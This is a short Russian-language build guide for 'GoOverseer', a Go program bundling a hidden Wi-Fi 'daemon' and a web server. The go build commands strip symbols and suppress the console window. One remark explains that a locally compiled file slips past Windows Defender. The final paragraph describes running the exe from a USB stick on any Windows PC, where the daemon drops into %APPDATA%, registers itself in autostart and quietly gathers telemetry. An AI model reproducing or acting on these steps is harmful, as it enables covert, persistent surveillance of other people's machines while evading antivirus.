********************************************************************
Шаг 1. Скомпилируйте демон Wi-Fi (без консольного окна):
********************************************************************
go build -trimpath -ldflags="-s -w -H windowsgui" -o utils/wifi/wifi_daemon.exe utils/wifi/wifi_worker.go
    (Так как сборка происходит локально на вашей машине, Windows Defender не считает этот файл «скачанным из интернета» и пропускает его).
********************************************************************
    Шаг 2. Скомпилируйте основной GoOverseer:
********************************************************************
go build -trimpath -ldflags="-s -w -H windowsgui" -o GoOverseer.exe .
    Результат: файл GoOverseer.exe весит около 15–18 МБ и содержит внутри веб-сервер, стили, шаблоны и уже скомпилированный бинарник демона.
********************************************************************
Вы можете скинуть один этот файл GoOverseer.exe на флешку, прийти на абсолютно любой ПК с Windows (где нет ни Go, ни Git, ничего), запустить его, нажать «Активировать модуль» — демон распакуется в %APPDATA%, пропишется в автозагрузку и начнёт собирать телеметрию без каких-либо внешних зависимостей.
